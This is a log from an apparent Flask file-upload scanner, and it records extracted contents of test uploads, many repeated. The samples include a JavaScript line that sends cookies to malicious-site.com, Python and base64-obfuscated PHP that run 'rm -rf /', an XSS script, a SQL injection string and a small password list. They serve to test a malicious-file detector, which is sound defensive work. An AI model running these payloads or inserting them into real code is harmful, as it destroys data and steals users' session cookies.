2025-02-22 20:50:14,223 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,225 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,226 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,228 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,230 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,232 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,233 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,234 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,236 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,237 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,238 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,241 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,243 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,244 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,246 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,248 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,249 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,251 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,253 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,254 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,256 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,258 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,260 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,262 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,263 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,265 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,266 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,268 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,269 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,271 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,273 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,274 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,276 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,277 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,279 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,280 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,282 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,283 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,284 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,286 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,287 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,289 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,293 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:50:14,293 - [33mPress CTRL+C to quit[0m
2025-02-22 20:50:17,271 - 127.0.0.1 - - [22/Feb/2025 20:50:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:50:17,446 - 127.0.0.1 - - [22/Feb/2025 20:50:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:50:23,389 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:50:23,390 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:50:23,390 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:50:23,395 - 127.0.0.1 - - [22/Feb/2025 20:50:23] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:50:23,404 - 127.0.0.1 - - [22/Feb/2025 20:50:23] "GET / HTTP/1.1" 200 -
2025-02-22 20:51:21,144 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,149 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,151 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,153 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,155 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,156 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,157 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,158 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,159 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,160 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,166 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,167 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,168 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,171 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,172 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,175 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,176 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,177 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,178 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,180 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,181 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,182 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,187 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,189 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,190 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,192 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,196 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,198 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,199 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,200 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,202 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,204 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,209 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,210 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,213 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,214 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,216 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,218 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,219 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,221 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,223 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,225 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,227 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,229 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,230 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,232 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,234 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,235 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,237 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,239 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,241 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,242 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,245 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,247 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,249 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,250 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,252 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,254 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,255 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,257 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,258 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,261 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

